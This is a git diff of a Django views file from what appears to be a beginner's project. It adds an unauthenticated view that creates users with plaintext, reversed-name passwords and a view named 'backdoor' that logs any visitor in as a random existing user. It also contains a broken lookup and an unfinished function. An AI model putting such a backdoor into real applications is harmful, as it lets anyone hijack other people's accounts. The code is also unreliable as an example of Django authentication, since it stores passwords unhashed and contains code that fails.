@@ -1,8 +1,13 @@
+from django.contrib.auth import login
+from django.contrib.auth.models import User
 from django.http import HttpResponse
 from django.shortcuts import render
 from django.views.generic import TemplateView
 
-from .models import product as prod
+from .models import product as prod, Book
+
+import random
+import string
 
 
 # Create your views here. для объявлений функций эндпоинтов
@@ -36,3 +41,24 @@ def get_obj_by_id(request, obj_id):                 #функция с плав�
         return HttpResponse("Not Found")
 
     #Изучить все методы запроса с TemplateView
+
+
+
+def create_random_user(requests):
+    name = '.'.join([random.choice(string.ascii_letters) for i in range(1, random.randint(1, 30))])
+    user = User(username=name, password=name[::-1])
+    user.save()
+    return HttpResponse("create_rendom_user")
+
+
+
+def backdoor(requests):
+    random_user=random.choice(User.objects.all())
+    login(requests, random_user)
+    user = User.objects.get(username='', password='')
+    return HttpResponse(random_user.username)
+
+
+def get_employers_name_list(requests):
+    all_book = Book.objects.all()
+
